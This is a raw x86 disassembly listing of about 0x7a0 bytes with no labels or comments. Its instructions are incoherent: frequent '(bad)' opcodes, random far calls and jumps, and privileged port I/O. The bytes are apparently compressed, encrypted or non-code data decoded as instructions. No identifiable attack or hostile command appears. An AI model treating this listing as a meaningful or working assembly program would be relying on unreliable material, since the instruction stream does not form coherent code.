  411f35:	std    
  411f36:	rcr    DWORD PTR [esi+0x48199a68],1
  411f3c:	jnp    0x411ed7
  411f3e:	inc    ecx
  411f3f:	in     eax,dx
  411f40:	inc    edi
  411f41:	pop    eax
  411f42:	ins    BYTE PTR es:[edi],dx
  411f43:	in     al,0xce
  411f45:	sub    edx,0xffffff92
  411f48:	(bad)  
  411f49:	xor    al,0xae
  411f4b:	or     DWORD PTR [edx],esp
  411f4d:	lahf   
  411f4e:	out    0x96,eax
  411f50:	inc    esp
  411f51:	(bad)  
  411f52:	cmc    
  411f53:	or     eax,0xd24e1076
  411f58:	test   al,0xac
  411f5a:	stos   BYTE PTR es:[edi],al
  411f5b:	add    ah,dl
  411f5d:	push   es
  411f5e:	inc    esp
  411f5f:	scas   eax,DWORD PTR es:[edi]
  411f60:	inc    ebp
  411f61:	icebp  
  411f62:	mov    dh,0x78
  411f64:	outs   dx,DWORD PTR ds:[esi]
  411f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f66:	retf   
  411f67:	inc    edi
  411f68:	(bad)  
  411f69:	repz dec esp
  411f6b:	pushf  
  411f6c:	pop    ds
  411f6d:	xor    esp,DWORD PTR [eax-0x6ad948dd]
  411f73:	push   esp
  411f74:	ja     0x411f9f
  411f76:	rcr    ebx,0x6e
  411f79:	fldln2 
  411f7b:	stos   DWORD PTR es:[edi],eax
  411f7c:	xor    DWORD PTR [esi+eax*4+0x4],ebp
  411f80:	out    dx,eax
  411f81:	jb     0x411faf
  411f83:	xchg   ebp,eax
  411f84:	or     ecx,eax
  411f86:	jbe    0x411f2f
  411f88:	retf   0x9afa
  411f8b:	xor    al,0x6
  411f8d:	stos   BYTE PTR es:[edi],al
  411f8e:	fldenv [edx]
  411f90:	stc    
  411f91:	xchg   edx,eax
  411f92:	dec    ecx
  411f93:	or     al,0x3
  411f95:	push   eax
  411f96:	mov    ch,0x36
  411f98:	in     al,0x8c
  411f9a:	mov    edx,0xe0da8cd9
  411f9f:	fiadd  DWORD PTR [ebp-0x10]
  411fa2:	lods   al,BYTE PTR ds:[esi]
  411fa3:	push   es
  411fa4:	push   eax
  411fa5:	call   0xc189:0xf12ade56
  411fac:	dec    ebx
  411fad:	add    BYTE PTR [ebx+0x1e97d678],0x89
  411fb4:	in     eax,0xf
  411fb6:	fld    QWORD PTR [ecx-0x23]
  411fb9:	add    DWORD PTR [edi],ebx
  411fbb:	jg     0x411fc5
  411fbd:	dec    esi
  411fbe:	push   ss
  411fbf:	in     eax,dx
  411fc0:	loop   0x411f8c
  411fc2:	adc    DWORD PTR [ebp+0x4b],edx
  411fc5:	push   es
  411fc6:	adc    al,0xaf
  411fc8:	inc    esi
  411fc9:	aaa    
  411fca:	xlat   BYTE PTR ds:[ebx]
  411fcb:	imul   ecx,DWORD PTR [edi],0xcceff42c
  411fd1:	and    dh,BYTE PTR [edx]
  411fd3:	mov    DWORD PTR [ebx],0x315b199
  411fd9:	cmc    
  411fda:	xchg   edi,eax
  411fdb:	mov    dl,0xe0
  411fdd:	mov    esi,0x9496ec92
  411fe2:	rcl    bh,cl
  411fe4:	mov    eax,ds:0x5a0fbbab
  411fe9:	xchg   edx,eax
  411fea:	jo     0x412038
  411fec:	mov    ecx,0x43ee8562
  411ff1:	xchg   esi,eax
  411ff2:	dec    ebx
  411ff3:	xchg   esi,eax
  411ff4:	mov    DWORD PTR [ebp+eax*8-0x45],eax
  411ff8:	les    edx,FWORD PTR [esi]
  411ffa:	push   0xffffff94
  411ffc:	in     al,dx
  411ffd:	mov    BYTE PTR [edi],bh
  411fff:	dec    ecx
  412000:	loopne 0x411ffc
  412002:	push   edi
  412003:	test   eax,0x506175ca
  412008:	mov    ds:0xa802188b,eax
  41200d:	(bad)  
  41200e:	cld    
  41200f:	sub    eax,0x474f392d
  412014:	pop    ecx
  412015:	mov    BYTE PTR [eax+0x13802e43],cl
  41201b:	cmp    BYTE PTR [eax+0x69],0xba
  41201f:	dec    esp
  412020:	push   edx
  412021:	adc    al,0xa1
  412023:	stos   BYTE PTR es:[edi],al
  412024:	xchg   edx,eax
  412025:	mov    eax,ds:0x1f3cedce
  41202a:	mov    ds:0x3869e88,al
  41202f:	das    
  412030:	push   edi
  412031:	mov    ebx,0x811514c9
  412036:	push   es
  412037:	call   0xb525:0x3e2b66cf
  41203e:	sbb    eax,0xe40139fe
  412043:	sub    eax,DWORD PTR [edx]
  412045:	mov    edi,0x32da90a2
  41204a:	adc    esp,esp
  41204c:	jno    0x41205f
  41204e:	push   ds
  41204f:	mov    ds:0xa5fd23cd,al
  412054:	(bad)  
  412055:	mov    bh,0x6e
  412057:	jecxz  0x4120ab
  412059:	cmp    dl,BYTE PTR [ecx-0x2c]
  41205c:	fstp   DWORD PTR [edi+0x69]
  41205f:	xor    al,0xbb
  412061:	sbb    DWORD PTR es:[ecx-0xd],esi
  412065:	add    al,0x26
  412067:	adc    DWORD PTR [edx-0x76],ebx
  41206a:	cmp    al,BYTE PTR [eax-0xbca18d8]
  412070:	in     eax,0x26
  412072:	cmp    ah,BYTE PTR [edi-0x62]
  412075:	sub    ebp,DWORD PTR [ebp-0x10102a90]
  41207b:	xlat   BYTE PTR ds:[ebx]
  41207c:	imul   esi,ecx,0x670c0a41
  412082:	inc    esi
  412083:	call   0x2fb2:0xe45858f7
  41208a:	push   ecx
  41208b:	fs jl  0x4120c7
  41208e:	xchg   edi,eax
  41208f:	xchg   ecx,eax
  412090:	dec    esi
  412091:	inc    ebp
  412092:	ret    0x5b18
  412095:	xor    BYTE PTR [edx+0x38],0x65
  412099:	mov    ah,BYTE PTR [edx-0xaf0d992]
  41209f:	xchg   ecx,eax
  4120a0:	out    0xad,eax
  4120a2:	pop    esp
  4120a3:	punpckhdq mm1,QWORD PTR [esp+ebx*8]
  4120a7:	and    BYTE PTR ds:0x324da109,al
  4120ad:	test   BYTE PTR [ebx+0x7d],ch
  4120b0:	mov    eax,ds:0xe64cc825
  4120b5:	stos   DWORD PTR es:[edi],eax
  4120b6:	mov    eax,DWORD PTR [ecx]
  4120b8:	xchg   ebx,eax
  4120b9:	ret    
  4120ba:	xor    BYTE PTR [ebp+0x5d],bl
  4120bd:	scas   al,BYTE PTR es:[edi]
  4120be:	inc    edi
  4120bf:	ja     0x412128
  4120c1:	cwde   
  4120c2:	popf   
  4120c3:	fsub   QWORD PTR [ecx]
  4120c5:	nop
  4120c6:	xchg   ah,cl
  4120c8:	mov    edx,0x72632bd4
  4120cd:	pop    ebp
  4120ce:	rcr    dl,0x88
  4120d1:	loopne 0x41207b
  4120d3:	outs   dx,BYTE PTR ds:[esi]
  4120d4:	inc    ecx
  4120d5:	mov    ebp,DWORD PTR [eax]
  4120d7:	(bad)  
  4120d8:	out    dx,al
  4120d9:	loope  0x4120e6
  4120db:	sbb    eax,0xa2e10569
  4120e0:	jg     0x412104
  4120e2:	cmp    esi,ecx
  4120e4:	cmp    al,0x2a
  4120e6:	adc    BYTE PTR fs:[edi+0x7fe036d0],al
  4120ed:	shr    bl,1
  4120ef:	push   edi
  4120f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120f1:	call   0xd7d1:0xc1f5998a
  4120f8:	xor    al,0x27
  4120fa:	out    dx,al
  4120fb:	aas    
  4120fc:	cwde   
  4120fd:	dec    esp
  4120fe:	mov    WORD PTR [ebx],es
  412100:	xchg   ebp,eax
  412101:	shr    BYTE PTR [ebx],1
  412103:	stc    
  412104:	stos   BYTE PTR es:[edi],al
  412105:	pop    ss
  412106:	pusha  
  412107:	pop    es
  412108:	inc    ebp
  412109:	les    ebx,FWORD PTR [esi-0x25]
  41210c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41210d:	add    eax,0x729459a4
  412112:	int3   
  412113:	mov    ecx,0x588a1a2d
  412118:	clc    
  412119:	cmp    esi,DWORD PTR [esi+0x4b43f55]
  41211f:	jge    0x412188
  412121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412122:	and    eax,0xce69d428
  412127:	mov    ecx,0xf55442d
  41212c:	push   ss
  41212d:	sub    eax,0x534ea980
  412132:	push   0xdec1e8fd
  412137:	ins    DWORD PTR es:[edi],dx
  412138:	in     eax,dx
  412139:	dec    eax
  41213a:	or     BYTE PTR [ebx-0x711a34fb],al
  412140:	sub    ch,BYTE PTR [eax-0x3e]
  412143:	xchg   edi,eax
  412144:	dec    edi
  412145:	add    edx,esi
  412147:	xchg   ecx,eax
  412148:	stc    
  412149:	pop    edx
  41214a:	int    0x8c
  41214c:	test   al,0x36
  41214e:	add    al,0x70
  412150:	aam    0x27
  412152:	and    DWORD PTR [ebx+0x6d397b8],0xffffff91
  412159:	jae    0x412131
  41215b:	sbb    DWORD PTR [edx-0x7ad8b7d9],ecx
  412161:	imul   edi,DWORD PTR ds:[esi+0x762855b4],0xffffffea
  412169:	lods   al,BYTE PTR ds:[esi]
  41216a:	and    bl,BYTE PTR [ebp+0x23]
  41216d:	fist   WORD PTR [ebp+0x52]
  412170:	dec    ebx
  412171:	xor    ebp,DWORD PTR [ebx+esi*4]
  412174:	fst    DWORD PTR cs:[esi-0x1555bfa1]
  41217b:	lahf   
  41217c:	or     DWORD PTR ds:0x5bf546eb,edx
  412182:	arpl   si,bp
  412184:	cmp    ebx,ebp
  412186:	cmp    BYTE PTR [edx-0xbe264ac],dl
  41218c:	pop    edi
  41218d:	aaa    
  41218e:	sbb    al,0xa1
  412190:	ds out 0x68,eax
  412193:	sub    DWORD PTR [edi],esp
  412195:	(bad)  
  412196:	sub    ecx,DWORD PTR [esi]
  412198:	mov    esp,0x78b1244
  41219d:	(bad)  
  41219e:	adc    ah,BYTE PTR [ebx-0x7c]
  4121a1:	fdivp  st(4),st
  4121a3:	imul   edi,DWORD PTR [edx],0xe3c859c5
  4121a9:	cmp    ah,BYTE PTR ds:0x8d6064ce
  4121af:	stos   DWORD PTR es:[edi],eax
  4121b0:	sbb    esi,DWORD PTR [ecx+0x1930f0b2]
  4121b6:	cmp    eax,0x34728714
  4121bb:	jbe    0x4121f7
  4121bd:	add    bh,BYTE PTR [esi-0x2e]
  4121c0:	ins    BYTE PTR es:[edi],dx
  4121c1:	outs   dx,DWORD PTR ds:[esi]
  4121c2:	and    esi,ecx
  4121c4:	mov    ah,0xbe
  4121c6:	add    eax,0xb9ebcc18
  4121cb:	cs mov dh,0xb
  4121ce:	hlt    
  4121cf:	sub    al,0x91
  4121d1:	jp     0x41219b
  4121d3:	jecxz  0x41220d
  4121d5:	outs   dx,BYTE PTR ds:[esi]
  4121d6:	or     BYTE PTR [edi-0x1e],0x5
  4121da:	pop    esi
  4121db:	jmp    0x5ac739ef
  4121e0:	cmc    
  4121e1:	shl    DWORD PTR [ebp-0x796239f9],cl
  4121e7:	test   DWORD PTR ds:[ebx+0x551eae99],edi
  4121ee:	fsincos 
  4121f0:	and    cl,BYTE PTR [esi]
  4121f2:	scas   al,BYTE PTR es:[edi]
  4121f3:	dec    ebp
  4121f4:	dec    esi
  4121f5:	loope  0x4121b6
  4121f7:	xchg   esp,eax
  4121f8:	push   0x51
  4121fa:	shl    esi,0x39
  4121fd:	shr    DWORD PTR [ecx-0x2f],cl
  412200:	jp     0x41219c
  412202:	sbb    DWORD PTR [ebp-0x2efda905],0x5fc7cec
  41220c:	xchg   ebp,eax
  41220d:	and    eax,0x875f0ea4
  412212:	inc    ebp
  412213:	std    
  412214:	ins    DWORD PTR es:[edi],dx
  412215:	pop    edx
  412216:	into   
  412217:	pushf  
  412218:	sub    al,0x92
  41221a:	retf   
  41221b:	inc    ecx
  41221c:	call   0x638:0x9867e834
  412223:	arpl   cx,sp
  412225:	call   0x2bf6:0x25535b35
  41222c:	pop    ebp
  41222d:	stos   BYTE PTR es:[edi],al
  41222e:	sub    DWORD PTR [ebp-0x49],ecx
  412231:	xor    ah,BYTE PTR [ecx]
  412233:	aaa    
  412234:	jmp    0x82abe819
  412239:	das    
  41223a:	sbb    eax,0xb7e0ff5f
  41223f:	(bad)  
  412240:	adc    eax,0x7eaf89d9
  412245:	jecxz  0x412227
  412247:	sub    DWORD PTR [ebp-0x1122c1bf],eax
  41224d:	pop    esi
  41224e:	ins    BYTE PTR es:[edi],dx
  41224f:	push   esp
  412250:	repnz xor ah,BYTE PTR [ebp-0x58]
  412254:	mov    al,ds:0x36753709
  412259:	xchg   ebp,eax
  41225a:	sub    edi,DWORD PTR [ebx]
  41225c:	out    0xe8,eax
  41225e:	push   es
  41225f:	enter  0xf6dd,0x85
  412263:	xor    DWORD PTR [esi+ebx*4-0x7b213847],esp
  41226a:	clc    
  41226b:	jns    0x412252
  41226d:	movzx  edx,bp
  412270:	and    al,0xb3
  412272:	add    dl,BYTE PTR [eax]
  412274:	or     edx,DWORD PTR [esi]
  412276:	pushf  
  412277:	pop    edx
  412278:	dec    ebx
  412279:	push   es
  41227a:	cmp    bl,dl
  41227c:	cdq    
  41227d:	cmp    dl,BYTE PTR [edx]
  41227f:	out    dx,al
  412280:	push   cs
  412281:	cs retf 
  412283:	mov    al,0xaf
  412285:	int3   
  412286:	scas   eax,DWORD PTR es:[edi]
  412287:	xchg   ebx,eax
  412288:	int3   
  412289:	sub    BYTE PTR ds:0x7d48621b,cl
  41228f:	je     0x4122c7
  412291:	out    0x7f,eax
  412293:	ja     0x412254
  412295:	jecxz  0x412296
  412297:	sbb    dl,BYTE PTR [eax]
  412299:	ins    DWORD PTR es:[edi],dx
  41229a:	push   esi
  41229b:	add    DWORD PTR [ebx+0x5d],edi
  41229e:	lods   al,BYTE PTR ds:[esi]
  41229f:	pop    es
  4122a0:	dec    DWORD PTR [eax-0x32]
  4122a3:	dec    ecx
  4122a4:	sub    al,0x95
  4122a6:	outs   dx,DWORD PTR ds:[esi]
  4122a7:	in     al,0x3e
  4122a9:	xchg   ebp,eax
  4122aa:	jg     0x412281
  4122ac:	loop   0x41229b
  4122ae:	xchg   BYTE PTR [ecx-0x42820341],dh
  4122b4:	mov    bl,0x6b
  4122b6:	loop   0x412298
  4122b8:	gs cmp eax,0x53923e14
  4122be:	push   es
  4122bf:	into   
  4122c0:	pop    esi
  4122c1:	sbb    BYTE PTR [ebx+0x67],ah
  4122c4:	into   
  4122c5:	pop    es
  4122c6:	ja     0x41227d
  4122c8:	sbb    ah,BYTE PTR [esi+0xd]
  4122cb:	stos   BYTE PTR es:[edi],al
  4122cc:	jne    0x4122b3
  4122ce:	iret   
  4122cf:	or     BYTE PTR [esi-0x6c928d6],0x34
  4122d6:	shl    DWORD PTR [ecx+0x5d72b02],0x48
  4122dd:	mov    ebp,0x4b92169e
  4122e2:	push   ecx
  4122e3:	dec    esi
  4122e4:	xor    DWORD PTR [edi],ecx
  4122e6:	push   esi
  4122e7:	fsub   DWORD PTR [ebp+0x756a5811]
  4122ed:	(bad)  
  4122ee:	shl    BYTE PTR [ebp+0x73],cl
  4122f1:	inc    eax
  4122f2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4122f4:	lahf   
  4122f5:	xchg   ebx,eax
  4122f6:	xchg   BYTE PTR [ecx+0x1ff48d19],dh
  4122fc:	test   BYTE PTR [esi-0x4fc53d3b],0x10
  412303:	bound  edi,QWORD PTR [ecx+0x48a69ebe]
  412309:	and    bh,dl
  41230b:	test   dl,dh
  41230d:	jb     0x41234c
  41230f:	push   0xffffffd7
  412311:	mov    esi,0x67e1470e
  412316:	push   0xffffffd9
  412318:	cwde   
  412319:	lds    edx,FWORD PTR [ebp-0x401a6f55]
  41231f:	mov    esi,0x19e613b0
  412324:	invlpg BYTE PTR [esi+eax*2+0x62ce715d]
  41232c:	sub    al,0x44
  41232e:	add    al,0x4b
  412330:	mov    ah,0xb5
  412332:	push   eax
  412333:	dec    edx
  412334:	add    BYTE PTR ds:0xca19886c,bh
  41233a:	fild   DWORD PTR [ebx+eiz*4]
  41233d:	pushf  
  41233e:	mov    ah,0x8b
  412340:	mov    es,WORD PTR [esi-0x6846ecca]
  412346:	mov    ebx,0x7b7a2e5b
  41234b:	out    dx,eax
  41234c:	xor    DWORD PTR [ecx-0x540ab035],ecx
  412352:	xchg   ebx,edi
  412354:	push   edi
  412355:	test   al,0x49
  412357:	xchg   ebp,eax
  412358:	loope  0x412377
  41235a:	sub    eax,0x16002929
  41235f:	and    eax,0x8d2eadee
  412364:	jnp    0x412372
  412366:	div    cl
  412368:	jp     0x4122f0
  41236a:	scas   eax,DWORD PTR es:[edi]
  41236b:	jb     0x41238c
  41236d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236e:	leave  
  41236f:	out    0xf9,eax
  412371:	or     al,0xbb
  412373:	outs   dx,BYTE PTR ds:[esi]
  412374:	cld    
  412375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412376:	mov    bh,0x2c
  412378:	or     eax,0xb427c6e4
  41237d:	sbb    eax,0xea780af1
  412382:	pop    ecx
  412383:	sar    DWORD PTR [bp+di-0x261f],0x2b
  412389:	repz xor dh,ah
  41238c:	es push 0xffffffed
  41238f:	add    eax,0x4b08f3d7
  412394:	addr16 ja 0x412361
  412397:	into   
  412398:	push   eax
  412399:	seto   BYTE PTR [eax-0x99feaee]
  4123a0:	mov    ebp,0x25f69f20
  4123a5:	cmc    
  4123a6:	and    al,0x58
  4123a8:	cli    
  4123a9:	int    0x5a
  4123ab:	pushf  
  4123ac:	es out dx,eax
  4123ae:	sar    BYTE PTR [ecx+0x802f8e3],1
  4123b4:	xchg   BYTE PTR [edx+0x566a195e],al
  4123ba:	repz lds esi,FWORD PTR [ebx-0x70951f1e]
  4123c1:	sub    al,0x10
  4123c3:	pop    ds
  4123c4:	sub    DWORD PTR [ebx+0x4d],ebx
  4123c7:	cmp    BYTE PTR [esi+0x24f5f3ca],cl
  4123cd:	test   ebx,esi
  4123cf:	jo     0x412354
  4123d1:	mov    ecx,0xc00b7df8
  4123d6:	sbb    DWORD PTR [esi],0x40c1c70
  4123dc:	cmp    bl,BYTE PTR [ebx-0x4c]
  4123df:	pop    eax
  4123e0:	sub    eax,0x8c2b1e0a
  4123e5:	ret    
  4123e6:	(bad)  
  4123e7:	icebp  
  4123e8:	ret    0xf528
  4123eb:	popf   
  4123ec:	dec    ebp
  4123ed:	xor    edx,DWORD PTR [esi]
  4123ef:	lods   al,BYTE PTR ds:[esi]
  4123f0:	iret   
  4123f1:	pop    ss
  4123f2:	cmp    ebx,DWORD PTR [edx+0x56]
  4123f5:	neg    DWORD PTR [esi]
  4123f7:	out    dx,eax
  4123f8:	sbb    al,0xf
  4123fa:	push   ebp
  4123fb:	xor    cl,BYTE PTR [esi]
  4123fd:	cmc    
  4123fe:	shl    DWORD PTR ds:0xbd331b16,1
  412404:	call   0xcb5e:0xe456ffb8
  41240b:	jne    0x4123aa
  41240d:	clc    
  41240e:	ror    BYTE PTR [eax+0x495ed7f],0x61
  412415:	xchg   ebx,eax
  412416:	mov    bh,0x13
  412418:	je     0x412431
  41241a:	stos   DWORD PTR es:[edi],eax
  41241b:	mov    ?,WORD PTR [edx+0x20]
  41241e:	fmul   QWORD PTR [ebp-0x80]
  412421:	stc    
  412422:	or     DWORD PTR [ebx+0x10],0xffffffc0
  412426:	lods   eax,DWORD PTR ds:[esi]
  412427:	jmp    0x53e4a1b
  41242c:	pop    ds
  41242d:	ret    
  41242e:	leave  
  41242f:	sti    
  412430:	(bad)  [edx+0x26431d94]
  412436:	pop    es
  412437:	(bad)  
  412438:	addr16 push ds
  41243a:	dec    esp
  41243b:	mov    bh,0x78
  41243d:	fimul  WORD PTR [eax]
  41243f:	mov    esi,0x5b1cd041
  412444:	int3   
  412445:	in     eax,dx
  412446:	mov    edx,0xfc63b1ad
  41244b:	add    al,0x73
  41244d:	pop    ss
  41244e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412450:	std    
  412451:	dec    ebx
  412452:	loope  0x412474
  412454:	xor    BYTE PTR [ebx],al
  412456:	out    0xc1,eax
  412458:	cdq    
  412459:	fld    TBYTE PTR [ebx]
  41245b:	xchg   esi,eax
  41245c:	stc    
  41245d:	adc    esi,DWORD PTR [edi-0x3e]
  412460:	or     edi,DWORD PTR [edx]
  412462:	xchg   ebp,eax
  412463:	dec    edx
  412464:	cmc    
  412465:	xchg   edi,eax
  412466:	mov    ebx,0x596e837d
  41246b:	jle    0x412468
  41246d:	dec    esi
  41246e:	pop    ds
  41246f:	and    BYTE PTR [ebx+0x24],ah
  412472:	loop   0x4123f5
  412474:	push   ebp
  412475:	popa   
  412476:	xchg   BYTE PTR [ebx+0x57638a21],cl
  41247c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41247d:	nop
  41247e:	enter  0xe823,0x98
  412482:	repnz shl BYTE PTR [edi],0x64
  412486:	mov    esi,0xcf4113c9
  41248b:	into   
  41248c:	sub    dl,BYTE PTR [edx-0xe4248aa]
  412492:	sub    al,BYTE PTR [ebx-0x11]
  412495:	jno    0x41245a
  412497:	lahf   
  412498:	test   al,0xa
  41249a:	fstp   DWORD PTR [ebx-0x1c78f4a4]
  4124a0:	pop    ss
  4124a1:	xor    DWORD PTR [ebp-0x4cc45c43],ecx
  4124a7:	xchg   ebp,eax
  4124a8:	test   DWORD PTR [edi-0x4f],esi
  4124ab:	fwait
  4124ac:	push   ebp
  4124ad:	call   0xbaf2c08
  4124b2:	(bad)  
  4124b3:	xor    edx,ebp
  4124b5:	jae    0x41244b
  4124b7:	shl    DWORD PTR [edi],0xa6
  4124ba:	(bad)  
  4124bb:	jg     0x4124cb
  4124bd:	xor    ebx,ecx
  4124bf:	xor    DWORD PTR [ebx+0x1aa10edc],0xfffffff5
  4124c6:	dec    edi
  4124c7:	sbb    al,0xc7
  4124c9:	and    ebx,DWORD PTR [edx+0x59]
  4124cc:	sbb    esi,edi
  4124ce:	sar    BYTE PTR [eax],0x71
  4124d1:	xlat   BYTE PTR ds:[ebx]
  4124d2:	adc    dl,BYTE PTR ds:0x80c9eb76
  4124d8:	jg     0x41254f
  4124da:	inc    ebx
  4124db:	loope  0x412496
  4124dd:	pop    ebp
  4124de:	jmp    0xc9e6cdf1
  4124e3:	mov    al,0x16
  4124e5:	jns    0x412546
  4124e7:	push   ss
  4124e8:	xlat   BYTE PTR ds:[ebx]
  4124e9:	bound  esi,QWORD PTR [esi]
  4124eb:	iret   
  4124ec:	inc    eax
  4124ed:	int    0x5
  4124ef:	jmp    0x44c31f21
  4124f4:	inc    edi
  4124f5:	shl    DWORD PTR [ecx+0x38],cl
  4124f8:	and    ebx,DWORD PTR [esi+0x61]
  4124fb:	(bad)  
  4124fc:	addr16 adc al,0x4a
  4124ff:	xor    BYTE PTR [esi],dl
  412501:	fs jp  0x4124f8
  412504:	xchg   ebx,eax
  412505:	loopne 0x41254c
  412507:	dec    ebp
  412508:	aad    0xa4
  41250a:	add    bh,bl
  41250c:	push   esi
  41250d:	adc    bl,BYTE PTR [ecx]
  41250f:	push   0xffffffd0
  412511:	enter  0x464d,0x12
  412515:	ins    BYTE PTR es:[edi],dx
  412516:	out    0x1b,al
  412518:	ret    0x8557
  41251b:	cdq    
  41251c:	or     al,0xae
  41251e:	push   0xa50ff262
  412523:	stc    
  412524:	inc    ecx
  412525:	in     al,dx
  412526:	dec    esi
  412527:	cmp    dl,dh
  412529:	dec    edi
  41252a:	aam    0x89
  41252c:	daa    
  41252d:	adc    al,0x24
  41252f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412530:	inc    edi
  412531:	stos   BYTE PTR es:[edi],al
  412532:	and    eax,0xef602b7d
  412537:	mov    al,0xed
  412539:	cmc    
  41253a:	pop    ecx
  41253b:	lahf   
  41253c:	ret    0x4f7a
  41253f:	xor    ah,BYTE PTR [ebx+0x3418d0ae]
  412545:	dec    ebp
  412546:	in     eax,dx
  412547:	out    dx,al
  412548:	and    eax,0xfb4a8844
  41254d:	pop    edi
  41254e:	fld    DWORD PTR gs:[edx-0x48]
  412552:	out    0x72,eax
  412554:	push   ecx
  412555:	dec    ebx
  412556:	mov    ebp,0xc985fab5
  41255b:	and    eax,0x9838fea8
  412560:	outs   dx,DWORD PTR ds:[esi]
  412561:	mov    ebp,0x344902f8
  412566:	cmp    ebx,DWORD PTR [eax+0x19c817ae]
  41256c:	dec    ebp
  41256d:	in     al,0x98
  41256f:	push   0x3b
  412571:	inc    ebx
  412572:	dec    edx
  412573:	mov    esp,DWORD PTR [ebx-0x49]
  412576:	ret    
  412577:	jae    0x41259f
  412579:	shl    BYTE PTR [ecx+ecx*2+0x1],1
  41257d:	cmc    
  41257e:	in     eax,0xd0
  412580:	mov    cl,0xa0
  412582:	cmp    al,0x96
  412584:	and    eax,DWORD PTR [eax+0x3f]
  412587:	aad    0xc1
  412589:	mov    al,0x4f
  41258b:	test   BYTE PTR [edx],dl
  41258d:	push   ebp
  41258e:	rol    BYTE PTR [ebp+edi*2-0x7d445fc],cl
  412595:	push   ss
  412596:	or     al,0xb9
  412598:	pop    ebp
  412599:	(bad)  
  41259a:	in     eax,0x7
  41259c:	or     ch,BYTE PTR [ebp-0x61b07747]
  4125a2:	fisub  DWORD PTR [edi-0x1b]
  4125a5:	sub    bl,dl
  4125a7:	jp     0x4125c5
  4125a9:	lock cmp BYTE PTR [edx+edi*4-0x67],bh
  4125ae:	push   es
  4125af:	cld    
  4125b0:	daa    
  4125b1:	popa   
  4125b2:	jb     0x41259d
  4125b4:	repz bound edi,QWORD PTR [eax*2+0x1a6ed674]
  4125bc:	add    bl,ah
  4125be:	push   ss
  4125bf:	dec    ebp
  4125c0:	and    esp,ebx
  4125c2:	xor    ecx,DWORD PTR ds:0xfa616c28
  4125c8:	enter  0x3654,0xbf
  4125cc:	jnp    0x41258e
  4125ce:	cmp    DWORD PTR [ebx],edx
  4125d0:	fdiv   QWORD PTR [edi]
  4125d2:	mov    al,ds:0x8fea511e
  4125d7:	into   
  4125d8:	mov    BYTE PTR [edx-0x54676889],dh
  4125de:	in     al,dx
  4125df:	sub    eax,0x831d3928
  4125e4:	iret   
  4125e5:	jno    0x4125c3
  4125e7:	iret   
  4125e8:	sbb    bh,bh
  4125ea:	or     eax,ebx
  4125ec:	(bad)  
  4125ed:	(bad)  
  4125ee:	pop    ds
  4125ef:	scas   eax,DWORD PTR es:[edi]
  4125f0:	js     0x41264c
  4125f2:	jno    0x412604
  4125f4:	fidivr DWORD PTR [esi-0x14]
  4125f7:	or     DWORD PTR [edx],ebx
  4125f9:	push   0x5f
  4125fb:	xchg   ebx,eax
  4125fc:	loop   0x412643
  4125fe:	fidiv  WORD PTR [eax-0x45]
  412601:	loop   0x4125b3
  412603:	ins    DWORD PTR es:[edi],dx
  412604:	gs jp  0x4125bc
  412607:	mov    ecx,0x76073303
  41260c:	pop    ebx
  41260d:	js     0x41261c
  41260f:	out    0x7f,al
  412611:	lahf   
  412612:	mov    ecx,0x16dbbcdd
  412617:	repz std 
  412619:	retf   
  41261a:	push   edi
  41261b:	sub    bl,BYTE PTR [ebx-0xd]
  41261e:	imul   eax,DWORD PTR [ebx+eax*4],0xe9c5022a
  412625:	push   cs
  412626:	out    dx,al
  412627:	test   BYTE PTR [edx+ebp*4-0x346e9207],bh
  41262e:	cs pop edi
  412630:	data16 test ah,cl
  412633:	pop    es
  412634:	push   edi
  412635:	adc    BYTE PTR [edx+edx*4+0x27],0x4b
  41263a:	ins    DWORD PTR es:[edi],dx
  41263b:	jno    0x412695
  41263d:	out    0xa7,al
  41263f:	jnp    0x412642
  412641:	dec    esp
  412642:	sbb    DWORD PTR [ecx-0x3c2e26bd],0x4d969692
  41264c:	mov    WORD PTR ds:[ebx-0x38b61951],gs
  412653:	pop    ecx
  412654:	dec    ecx
  412655:	rcl    DWORD PTR [ebp-0x35c5e496],0x1
  41265c:	inc    edx
  41265d:	adc    dh,ah
  41265f:	sub    eax,DWORD PTR [edx]
  412661:	in     al,dx
  412662:	int    0xb0
  412664:	test   DWORD PTR [ecx-0x2b2277d8],ebx
  41266a:	pusha  
  41266b:	jbe    0x4126ad
  41266d:	xlat   BYTE PTR ds:[ebx]
  41266e:	sahf   
  41266f:	scas   al,BYTE PTR es:[edi]
  412670:	jb     0x412685
  412672:	adc    bl,BYTE PTR [ebx-0x1fef0a9a]
  412678:	call   0x25e688ea
  41267d:	and    DWORD PTR [ebx],edx
  41267f:	inc    esi
  412680:	mov    edi,DWORD PTR es:[ecx-0x11]
  412684:	xchg   ebx,eax
  412685:	jo     0x41268c
  412687:	fstp   DWORD PTR [esi]
  412689:	hlt    
  41268a:	aam    0xd2
  41268c:	sub    al,al
  41268e:	fiadd  WORD PTR [edi-0x981e105]
  412694:	mov    ebx,DWORD PTR [ecx-0x3d382276]
  41269a:	pop    edi
  41269b:	retf   
  41269c:	cmp    BYTE PTR [ebp+0x2b],0x6f
  4126a0:	or     DWORD PTR [ebp+0x7b1f3344],0x27
  4126a7:	or     ah,ah
  4126a9:	adc    BYTE PTR [ecx],al
  4126ab:	inc    ebp
  4126ac:	cli    
  4126ad:	jmp    0x41268a
  4126af:	addr16 jl 0x4126fc
  4126b2:	mov    dl,BYTE PTR [ecx-0x72]
  4126b5:	mov    al,ds:0x4e35ff4c
  4126ba:	pop    es
  4126bb:	test   DWORD PTR [ecx-0x32],esp
  4126be:	adc    bl,BYTE PTR [ebx+0x68]
  4126c1:	pusha  
  4126c2:	mov    ecx,0xef18bebd
  4126c7:	dec    ebp
  4126c8:	cs mov cl,al
  4126cb:	in     eax,dx
  4126cc:	gs pop es
  4126ce:	inc    esi
  4126cf:	and    eax,0x7a4ca1ba
  4126d4:	out    0x2d,al
  4126d6:	sbb    DWORD PTR [ebp-0x547f3220],ecx
  4126dc:	neg    al
  4126de:	in     al,dx
